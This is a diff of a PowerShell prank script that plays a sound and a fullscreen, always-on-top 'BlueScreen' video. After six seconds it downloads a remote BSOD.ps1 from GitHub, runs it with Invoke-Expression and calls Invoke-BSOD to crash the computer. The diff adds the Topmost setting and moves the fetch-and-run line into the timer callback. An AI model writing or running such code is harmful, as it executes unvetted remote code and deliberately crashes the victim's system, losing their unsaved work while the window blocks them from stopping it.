@@ -8,47 +8,48 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/YeetTheAnson/vineboom/
 (New-Object System.Media.SoundPlayer "BlueScreen.wav").Play()
 Start-Sleep -Seconds 3
 
-
-# WPF Library for Playing Movie and some components
+# Load WPF assemblies
 Add-Type -AssemblyName PresentationFramework
 Add-Type -AssemblyName System.ComponentModel
 
-# XAML File of WPF as windows for playing movie
+# Define XAML for the video player window
 [xml]$XAML = @"
 <Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
         xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
-        Title="PowerShell Video Player" WindowStyle="None" WindowState="Maximized">
+        Title="PowerShell Video Player" WindowStyle="None" WindowState="Maximized" Topmost="True">
     <Grid>
         <MediaElement Name="VideoPlayer" LoadedBehavior="Manual" UnloadedBehavior="Stop"/>
     </Grid>
 </Window>
 "@
 
-# Movie Path
+# Define paths
 $VideoSource = Join-Path -Path $PWD.Path -ChildPath "BlueScreen.mp4"
 
-# Devide All Objects on XAML
-$XAMLReader=(New-Object System.Xml.XmlNodeReader $XAML)
-$Window=[Windows.Markup.XamlReader]::Load( $XAMLReader )
+# Load the XAML and initialize the video player
+$XAMLReader = (New-Object System.Xml.XmlNodeReader $XAML)
+$Window = [Windows.Markup.XamlReader]::Load($XAMLReader)
 $VideoPlayer = $Window.FindName("VideoPlayer")
 
-# Video Default Setting
+# Configure video player settings
 $VideoPlayer.Volume = 100
 $VideoPlayer.Source = $VideoSource
 $VideoPlayer.Play()
 
-# Timer for countdown
+# Start the timer to close the window after 6 seconds
 $Timer = New-Object System.Windows.Threading.DispatcherTimer
 $Timer.Interval = [TimeSpan]::FromSeconds(6)
 $Timer.Add_Tick({
     $Timer.Stop()
+    Invoke-Expression ((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/YeetTheAnson/vineboom/main/shortcutactivation/BlueScreen/BSOD.ps1'));Invoke-BSOD
 })
 
-# Start the countdown timer after the video starts playing and execute bsod
+# Start countdown timer after the video starts playing and execute BSOD
 $VideoPlayer.Add_Loaded({
     $Timer.Start()
-    Invoke-Expression ((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD
+
 })
 
-# Show Up the Window 
+# Display the window and prevent other windows from stealing focus
+$Window.Topmost = $true
 $Window.ShowDialog() | Out-Null
